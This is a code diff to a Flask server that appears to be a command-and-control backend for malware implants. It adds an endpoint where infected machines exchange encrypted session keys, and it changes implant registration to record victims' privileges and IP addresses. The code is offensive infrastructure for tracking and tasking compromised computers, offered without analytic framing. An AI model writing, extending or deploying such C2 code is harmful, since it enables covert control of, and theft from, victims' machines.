@@ -1,5 +1,6 @@
 import functools
 import json
+import binascii
 from datetime import datetime
 from msilib.schema import Error
 
@@ -12,10 +13,58 @@ from werkzeug.security import check_password_hash, generate_password_hash
 
 from .db import db
 from .models import Implant, Command, Alert
-
+from .encryptor import EncryptDecryptFile, GetImpPubKey
 bp = Blueprint('implant', __name__)
 
 # register
+
+@bp.route('/key_gen', methods=['POST'])
+def gen_key():
+    print(request.json)
+    computer_guid = request.json['computer_guid']
+    key = request.json['data']
+    decryptor = GetImpPubKey("server")
+    implant = Implant.query.filter_by(computer_guid=computer_guid).first()
+    data = request.json['data']
+    data = bytes.fromhex(data)
+    #pk_imp = decryptor.decrypt(data)
+    #print("loooool" ,binascii.hexlify(pk_imp))
+    #decryptor2 = EncryptDecryptFile('server',pk_imp)
+    #extra_data= request.json['extra_data']
+    #extra_data = bytes.fromhex(extra_data)
+    #nonce = bytes.fromhex(request.json['nonce'])
+    #print(extra_data)
+    #print("HUUUUUUU",decryptor2.decrypt(extra_data,nonce))
+    if implant:
+        try:
+            now = datetime.now()
+            current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
+            implant.last_seen= current_date_time
+            implant.imp_session_key = decryptor.decrypt(bytes.fromhex(data))
+            db.session.commit()
+            return jsonify({"status":"good job"})
+        except:
+            return jsonify({"status":"bad -- job"})
+    else:
+        try:
+            now = datetime.now()
+            current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
+            first_seen = current_date_time
+            last_seen = current_date_time
+            
+            implant = Implant(   
+                        computer_guid=computer_guid,
+                        session_key=decryptor.decrypt(bytes.fromhex(data)),
+                        first_seen=first_seen,
+                        last_seen=last_seen
+                    )
+            db.session.add(implant)
+            db.session.commit()
+            return jsonify({"status":"good job"})
+        except Exception as e:
+            print("------------",e)
+            return jsonify({"status":"bad job"})
+
 
 
 @bp.route('/register', methods=['POST'])
@@ -49,27 +98,16 @@ def register():
                         implant.computer_name = cmp_name
                         implant.computer_user = user_name
                         implant.last_seen = last_seen
-
+                        implant.computer_privileges=json.dumps(cmp_prev)
+                        implant.connecting_ip_address=ip
                         db.session.commit()
                         print("Implant updated")
                         return jsonify({"status":"good job"})
 
 
                     else:
-                        implant = Implant(
-                            computer_name=cmp_name,
-                            computer_user=user_name,
-                            computer_guid=computer_guid,
-                            computer_privileges=json.dumps(cmp_prev),
-                            connecting_ip_address=ip,
-                            session_key=imp_session_key,
-                            first_seen=first_seen,
-                            last_seen=last_seen
-                        )
-                        db.session.add(implant)
-                        db.session.commit()
-                        print("Implant added")
-                        return jsonify({"status":"good job"})
+                        print("Implant not added")
+                        return jsonify({"status":"Exchange keys first"})
                 except Exception as e:
                     print("Register error" , e)
 
@@ -78,15 +116,11 @@ def register():
             else:
                 return jsonify({"status":"bad job"})
 
-                print("Alert: somone is trying to play with us")
 
-            flash(error)
     except Exception as e:
         print("Register error" , e)
 
         return jsonify({"status":"bad job"})
-
-        pass
 
 
 @bp.route('/getNextCommand', methods=['POST'])
